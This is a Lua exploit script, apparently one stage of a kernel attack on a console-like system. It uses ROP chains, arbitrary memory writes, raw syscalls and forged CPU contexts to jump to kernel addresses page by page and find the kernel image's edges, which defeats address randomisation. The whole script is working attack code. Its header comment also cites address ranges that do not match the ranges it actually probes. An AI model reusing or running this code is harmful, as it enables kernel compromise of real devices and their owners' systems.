-- CRASH_CLASS: HIGH
-- PROBE 1002a: find the exact edges of the kernel image
--
-- 1001a swept 0xFFFFFFFF80000000..0xFFFFFFFFC0000000 at 2 MB and found only two
-- mapped runs: one step at the very base and 49 steps from 0xFFFFFFFF91800000 to
-- 0xFFFFFFFF97800000. This run resolves both edges at 4 KB.

local RUNS = {
    { 0xFFFFFFFFD7800000, 0xFFFFFFFFD8800000 },
    { 0xFFFFFFFFDDF00000, 0xFFFFFFFFDE200000 },
}
local STEP  = 0x1000
local SLEEP = 25

print("=== PROBE 1002a: KERNEL BASE EDGES ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end

print(string.format("[0] pid=%u fd=%u", to_num(mk(20)()), rd(signal.fd_addr) or 0))
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x40)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_add_to_rax(0x100)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(mk(431), function() chain:push_set_rdi(0) end)

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page*4)
local start = block + page*4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa = as_addr(ctx)
print(string.format("[1] block=0x%X ctx=0x%X", block, ctxa))

local n = 0
for _, run in ipairs(RUNS) do
    local a, b = run[1], run[2]
    print(string.format("[R] 0x%X .. 0x%X", a, b))
    local t = a
    while t < b do
        for o=0,0x4F8,8 do wq(ctxa+o,0) end
        wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
        wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
        wq(ctxa+Ctx.RIP,t); wq(ctxa+Ctx.RSP,start)
        wq(as_addr(tb),0)
        print(string.format("[P%04d] 0x%X", n, t))
        pcall(function() mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
        wq(as_addr(ts),0); wq(as_addr(ts)+8,SLEEP*1000000)
        pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
        n = n + 1
        t = t + STEP
    end
end
print(string.format("[E] probes=%u alive pid=%u", n, to_num(mk(20)())))
print("=== COMPLETE ===")
